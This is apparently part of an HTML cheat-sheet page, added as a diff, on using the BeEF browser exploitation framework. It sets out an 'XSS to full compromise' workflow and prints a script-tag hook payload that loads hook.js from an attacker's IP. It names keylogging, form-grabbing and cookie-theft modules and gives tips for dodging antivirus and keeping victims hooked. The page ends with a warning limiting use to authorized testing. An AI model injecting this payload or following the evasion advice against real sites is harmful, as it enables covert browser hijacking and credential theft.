+    <div class="section-title">Complete Workflow — XSS to Full Compromise</div>
+    <div class="workflow">
+      <div class="wf-step">
+        <div class="wf-title">Step 1: Start BeEF Server</div>
+        <div class="wf-desc"><div class="code-block" style="margin-top:10px"><code>sudo beef-xss</code><button class="copy-btn" onclick="copyText('sudo beef-xss',this)">COPY</button></div></div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 2: Login to Web UI</div>
+        <div class="wf-desc">Open <code>http://127.0.0.1:3000/ui/panel</code> and login with credentials.</div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 3: Find XSS Vulnerability</div>
+        <div class="wf-desc">Use Dalfox, XSStrike, or Burp to find reflected/stored XSS on target.</div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 4: Inject Hook Payload</div>
+        <div class="wf-desc"><div class="code-block" style="margin-top:10px"><code>&lt;script src="http://YOUR-IP:3000/hook.js"&gt;&lt;/script&gt;</code><button class="copy-btn" onclick="copyText('<script src=\"http://YOUR-IP:3000/hook.js\"></script>',this)">COPY</button></div></div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 5: Wait for Hook</div>
+        <div class="wf-desc">When victim visits the page, they appear in BeEF's UI as Online Browsers.</div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 6: Run Recon Modules</div>
+        <div class="wf-desc">Fingerprint browser, OS, extensions, plugins. Get internal IP.</div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 7: Run Attack Modules</div>
+        <div class="wf-desc">Keylogger, form grabber, port scan, screenshot, cookie theft.</div>
+      </div>
+      <div class="wf-step">
+        <div class="wf-title">Step 8: Demonstrate Impact</div>
+        <div class="wf-desc">Generate report from BeEF's web UI showing all actions performed.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">BeEF Configuration</div>
+
+    <div class="command">
+      <div class="command-title">35. Edit Config</div>
+      <div class="command-purpose">Change credentials, port, hook URL, and modules.</div>
+      <div class="code-block"><code>sudo nano /usr/share/beef-xss/config.yaml</code><button class="copy-btn" onclick="copyText('sudo nano /usr/share/beef-xss/config.yaml',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">36. Enable/Disable Modules</div>
+      <div class="command-purpose">Enable specific modules for cleaner UI, or disable risky ones.</div>
+      <div class="code-block"><code>nano /usr/share/beef-xss/modules/exploits/</code><button class="copy-btn" onclick="copyText('nano /usr/share/beef-xss/modules/exploits/',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">37. Change Default Credentials</div>
+      <div class="command-purpose">CRITICAL — change in config.yaml before using.</div>
+      <div class="code-block"><code># In config.yaml:
+beef:
+    credentials:
+        user: "admin"
+        pass: "YourStrongPassword123!"</code><button class="copy-btn" onclick="copyText('beef:\n    credentials:\n        user: \"admin\"\n        pass: \"YourStrongPassword123!\"',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">38. Hook URL (Public IP)</div>
+      <div class="command-purpose">Set public IP for external hooks (behind NAT).</div>
+      <div class="code-block"><code># In config.yaml:
+beef:
+    http:
+        host: "0.0.0.0"
+        port: 3000
+    public: "your.public.ip.address"</code><button class="copy-btn" onclick="copyText('beef:\n    http:\n        host: \"0.0.0.0\"\n        port: 3000\n    public: \"your.public.ip.address\"',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">39. Enable HTTPS</div>
+      <div class="command-block"><code># In config.yaml:
+beef:
+    http:
+        https:
+            enable: true
+            key: "/path/to/key.pem"
+            cert: "/path/to/cert.pem"</code><button class="copy-btn" onclick="copyText('beef:\n    http:\n        https:\n            enable: true\n            key: \"/path/to/key.pem\"\n            cert: \"/path/to/cert.pem\"',this)">COPY</button></div>
+    </div>
+
+    <div class="command">
+      <div class="command-title">40. Logs Location</div>
+      <div class="code-block"><code>tail -f /usr/share/beef-xss/beef.log</code><button class="copy-btn" onclick="copyText('tail -f /usr/share/beef-xss/beef.log',this)">COPY</button></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Common Flags Reference</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Flag</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><code>-a</code></td><td>Bind to specific IP</td></tr>
+          <tr><td><code>-p</code></td><td>Port (default 3000)</td></tr>
+          <tr><td><code>-c</code></td><td>Config file path</td></tr>
+          <tr><td><code>-x</code></td><td>Disable XSS-related modules</td></tr>
+          <tr><td><code>--no-color</code></td><td>Disable color output</td></tr>
+          <tr><td><code>--debug</code></td><td>Enable debug mode</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">BeEF vs Other Tools</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tool</th><th>Purpose</th><th>Best For</th></tr></thead>
+        <tbody>
+          <tr><td><strong>BeEF</strong></td><td>Client-side browser exploitation</td><td>XSS post-exploitation</td></tr>
+          <tr><td><strong>Metasploit</strong></td><td>Server/system exploitation</td><td>Traditional pentesting</td></tr>
+          <tr><td><strong>XSS Hunter</strong></td><td>Blind XSS detection</td><td>Finding hidden XSS</td></tr>
+          <tr><td><strong>XSStrike</strong></td><td>XSS scanner</td><td>Detecting XSS vulns</td></tr>
+          <tr><td><strong>Dalfox</strong></td><td>XSS scanner</td><td>Fast XSS scanning</td></tr>
+          <tr><td><strong>Responder</strong></td><td>Network credential capture</td><td>MITM credential theft</td></tr>
+          <tr><td><strong>Sliver</strong></td><td>C2 framework</td><td>Post-exploitation C2</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Troubleshooting</div>
+    <h3>"BeEF won't start — Ruby error"</h3>
+    <ul>
+      <li>Check Ruby version: <code>ruby -v</code> (needs 2.6+)</li>
+      <li>Reinstall: <code>cd /usr/share/beef-xss && sudo ./install</code></li>
+      <li>Check logs: <code>tail -50 /usr/share/beef-xss/beef.log</code></li>
+    </ul>
+
+    <h3>"Browser hooked but modules don't work"</h3>
+    <ul>
+      <li>Some modules need browser permissions</li>
+      <li>Check BeEF log for errors</li>
+      <li>Refresh hooked browser — sometimes the hook times out</li>
+    </ul>
+
+    <h3>"Hook not working over Internet"</h3>
+    <ul>
+      <li>Set public IP in config.yaml</li>
+      <li>Open ports 3000, 6789, 61985, 61986 on firewall/router</li>
+      <li>Use ngrok/Cloudflare Tunnel for HTTPS</li>
+      <li>Consider NAT traversal issues</li>
+    </ul>
+
+    <h3>"Hooks disappear after a while"</h3>
+    <ul>
+      <li>BeEF hooks expire after browser closes tab</li>
+      <li>Use Persistence → Man-In-The-Browser module</li>
+      <li>Keep victim's tab open</li>
+    </ul>
+
+    <h3>"Port scanner too slow"</h3>
+    <ul>
+      <li>Reduce port range in module settings</li>
+      <li>Use WebRTC-based port scan (faster)</li>
+      <li>Combine with DNS enumeration for host discovery</li>
+    </ul>
+
+    <h3>"Antivirus blocks hook.js"</h3>
+    <ul>
+      <li>Obfuscate hook (BeEF has options)</li>
+      <li>Use HTTPS + valid cert</li>
+      <li>Serve from domain that looks legitimate</li>
+    </ul>
+  </div>
+
+  <div class="warning">
+    <div class="warning-icon">⚠</div>
+    <div class="warning-text">
+      <strong>AUTHORIZED USE ONLY.</strong> BeEF hooks browsers without the user's knowledge — this is <strong>illegal</strong> without explicit permission. Only use BeEF:
+      <br>• Against your own browser (for learning)
+      <br>• In authorized penetration tests (signed contract)
+      <br>• In CTF competitions and lab environments
+      <br>• For security awareness demonstrations
+      <br>
+      <br>Unauthorized use of BeEF violates the CFAA (US), Computer Misuse Act (UK), IT Act (India), and similar laws worldwide. Penalties include <strong>years in prison</strong> and heavy fines. Always get written authorization first.
+    </div>
+  </div>
+
+  <div class="footer">SAINICOMMANDHUB · MASTER THE COMMAND. MASTER THE SYSTEM.</div>
+</div>
+
+<div class="toast" id="toast"><span>✓</span><span id="toastMsg">Copied</span></div>
+
+<script>
+function copyText(text,btn){
+  navigator.clipboard.writeText(text).then(()=>{
+    const orig=btn.textContent;
+    btn.textContent='✓ COPIED';
+    btn.classList.add('copied');
+    const t=document.getElementById('toast');
+    document.getElementById('toastMsg').textContent='Copied to clipboard';
+    t.classList.add('show');
+    setTimeout(()=>t.classList.remove('show'),2000);
+    setTimeout(()=>{btn.textContent=orig;btn.classList.remove('copied')},1500);
+  }).catch(()=>{});
+}
+function initMatrix(){
+  const c=document.getElementById('matrix');if(!c)return;
+  const ctx=c.getContext('2d');
+  function resize(){c.width=innerWidth;c.height=innerHeight}
+  resize();
+  const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  const fs=14;let cols=Math.floor(c.width/fs);let drops=Array(cols).fill(1);
+  setInterval(()=>{
+    ctx.fillStyle='rgba(8,5,13,.03)';ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#b800ff';ctx.font=fs+'px JetBrains Mono,monospace';
+    for(let i=0;i<drops.length;i++){
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,drops[i]*fs);
+      if(drops[i]*fs>c.height&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    }
+  },60);
+  addEventListener('resize',()=>{resize();cols=Math.floor(c.width/fs);drops=Array(cols).fill(1)});
+}
+document.addEventListener('DOMContentLoaded',initMatrix);
+</script>
+</body>
+</html>
